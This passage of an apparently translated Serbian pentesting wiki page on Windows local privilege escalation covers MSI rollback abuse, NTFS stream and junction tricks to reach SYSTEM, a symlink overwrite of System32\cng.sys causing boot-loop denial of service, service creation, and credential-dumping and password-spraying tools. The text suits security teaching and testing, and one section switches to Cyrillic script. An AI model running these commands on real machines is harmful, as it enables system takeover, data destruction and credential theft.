    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da izbriše `.rbf`, a pošto ne može da izbriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi (napadač) ručno brišete datoteku `.rbf`.
    - Sada je **`C:\Config.Msi` prazan**, spreman za preuzimanje kontrole.

> U ovom trenutku **pokrenite ranjivost za brisanje proizvoljnog direktorijuma na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa `WRITE_DAC`.

- Korak 7: Pokrenite novu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim vrednostima:
        - `TARGETDIR`: Lokacija u koju može da se upisuje.
        - `ERROROUT`: Promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs` datoteke
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi nova `.rbs` datoteka.
    - Zabeležite njeno ime.

- Korak 9: Sinhronizujte se pre rollback-a
    - `.msi` sadrži **prilagođenu install akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon što primite događaj `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa `WRITE_DAC`, možete **ponovo primeniti slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Ubacite lažne `.rbs` i `.rbf` datoteke
    - Prepišite datoteku `.rbs` **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu datoteku `.rbf` (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Ubacite lažnu datoteku `.rbf` koja sadrži **zlonamerni DLL payload na nivou SYSTEM**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal sinhronizacionom događaju kako bi installer nastavio.
    - Konfigurisana je **prilagođena akcija tipa 19 (`ErrorOut`)** koja **namerno izaziva neuspeh instalacije** u poznatoj tački.
    - Time započinje **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš DLL iz `.rbf` na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Завршни корак: Извршите SYSTEM код
    - Покрените поуздани **auto-elevated бинарни фајл** (нпр. `osk.exe`) који учитава DLL над којим сте преузели контролу.
    - **И то је то**: ваш код се извршава **као SYSTEM**.


### Од произвољног брисања/премештања/преименовања датотека до SYSTEM EoP

Главна MSI rollback техника (претходна) подразумева да можете да обришете **цео директоријум** (нпр. `C:\Config.Msi`). Али шта ако ваша рањивост омогућава само **произвољно брисање датотека**?

Можете да искористите **NTFS интерне механизме**: сваки директоријум има скривени алтернативни ток података који се зове:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj tok čuva **metapodatke indeksa** fascikle.

Dakle, ako **izbrišete tok `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vaš primitiv ne dozvoljava brisanje proizvoljnih datoteka/fascikli, ali **dozvoljava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Napravite fasciklu-mamac i datoteku
- Napravite: `C:\temp\folder1`
- U njoj napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokreni SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemoj direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvori `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS stream koji čuva metapodatke fascikle — njegovo brisanje briše fasciklu.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja sa radom i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavljate slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši sistem ili zaustavlja pokretanje**.
- **Nema rezervnog rešenja** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/backup + OM symlinks do proizvoljnog prepisivanja fajlova / boot DoS

Kada **privilegovani servis** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije u koju može da se upisuje**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili privilegovani upis u proizvoljno prepisivanje fajlova (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Uslovi**
- Konfiguracija koja sadrži ciljnu putanju mora da bude upisiva za napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali odredišnu putanju privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada obavlja u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu ciljnu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita putanju do izmenjenog drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, Windows može prvo da pokuša da učita nju, što je čini pouzdanim odredištem za DoS izazvan oštećenim podacima.



## **Od visokog integriteta do SYSTEM**

### **Nova usluga**

Ako već radite u procesu visokog integriteta, **put do SYSTEM-a** može biti jednostavan: samo **napravite i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja binarne datoteke za servis, proverite da li je to validan servis ili da li binarna datoteka obavlja potrebne radnje dovoljno brzo, jer će biti prekinuta za 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa High Integrity nivoom možete pokušati da **omogućite AlwaysInstallElevated unose u registru** i da **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o ključevima registra i načinu instaliranja _.msi_ paketa možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima High Integrity nivo), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično podrazumeva **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese bez svih privilegija tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika podrazumeva **kreiranje pipe-a, a zatim kreiranje/zloupotrebu servisa za upisivanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **imitira token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa High Integrity nivoa na System pomoću named pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a uz to ga je **mnogo lakše izvesti iz procesa sa High Integrity nivoom**, jer taj proces ima **dozvole za pisanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovan.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izdvaja sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough na lokalnom računaru.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izdvaja akreditive iz Credential Manager-a. Detektovan.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS alat za spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, koristite Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (potrebno je kompajlirati pomoću VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za pogrešnim konfiguracijama (više služi za prikupljanje informacija nego za privesc) (potrebno je kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izdvaja akreditive iz mnogih softvera (precompiled exe na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (precompiled executable na GitHub-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz Python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ove objave (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže exploite koji rade (lokalni Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže exploite koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da pokrenete:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - radionica za lokalnu eskalaciju privilegija u Windows-u i Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi crni (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija u Windows-u - kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje akreditiva hMailServer-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string-a + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Srebrnom lisicom: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – korišćenje CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza sa prošlošću: zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Rešeni izazovi sa C/C++ kontrolne liste](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: ulančavanje CLDFLT-a i uslova trke u DirectX kernelu radi lokalne eskalacije privilegija u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: primitiva za potpuno čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka radi eskalacije privilegija i drugi korisni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC za CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - izdvajanje privatnih SSH ključeva iz SSH agenta u Windows-u 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
